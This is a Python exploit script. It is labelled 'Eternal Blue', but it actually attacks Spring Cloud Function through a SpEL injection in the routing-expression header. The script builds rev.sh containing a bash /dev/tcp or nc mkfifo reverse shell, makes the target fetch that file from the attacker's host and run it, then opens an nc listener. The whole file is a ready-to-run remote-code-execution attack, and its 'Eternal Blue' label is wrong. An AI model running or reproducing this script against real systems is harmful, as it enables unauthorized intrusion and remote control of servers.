import os
import argparse
import sys
import time
from colorama import Fore

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET
                                                                                                                                                                        
parser = argparse.ArgumentParser(description="Eternal Blue",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser = argparse.ArgumentParser(description="Eternal Blue", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-u", "--URL", action="store", help="URL")
parser.add_argument("-p", "--LPORT", action="store", help="LPORT")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST")
parser.add_argument("-w", "--WEB", action="store", help="Local Web Server Port")
parser.add_argument("-b", "--BASH", action="store_true", help="Bash reverse shell")
parser.add_argument("-n", "--NC", action="store_true", help="NC MKFIFO reverse shell")

args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

URL = args.URL
LPORT = args.LPORT
LHOST = args.LHOST
BASH = args.BASH
NC = args.NC
WEB = args.WEB

if WEB is None:
	WEB = input(f"{RED}Local web server port{RESET} \n")
print(f"{YELLOW}Creating rev.sh file{RESET}")
if BASH is not None:
	with open ("rev.sh", "w") as f:
		f.write(f"#!/bin/bash \n")
	with open ("rev.sh", "a") as f:
		f.write(f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1")
if NC is not None:
	with open ("rev.sh", "w") as f:
		f.write(f"#!/bin/bash \n")
	with open ("rev.sh", "a") as f:
		f.write(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f")
print(f"{YELLOW}Sending rev.sh to {URL}{RESET}")
start = input(f"{RED}Start web server on port {BLUE}{WEB}{RED} on host {BLUE}{LHOST}{RED} and nc on port {BLUE}{LPORT}{RED} with nc -lvnp {BLUE}{LPORT}{RED}, press enter to continue{RESET}")
if URL is None:
	URL = input(f"{RED}URL to attack {RESET} \n")
os.system(f"curl -X POST {URL} -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"curl http://{LHOST}:{WEB}/rev.sh -o /tmp/rev.sh\")' --data-raw 'data' -v")
print(f"{YELLOW}Calling for reverse shell{RESET}")
time.sleep(2)
os.system(f"curl -X POST {URL} -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"bash /tmp/rev.sh\")' --data-raw 'data' -v")                             
os.system(f"nc -lvnp {LPORT}")
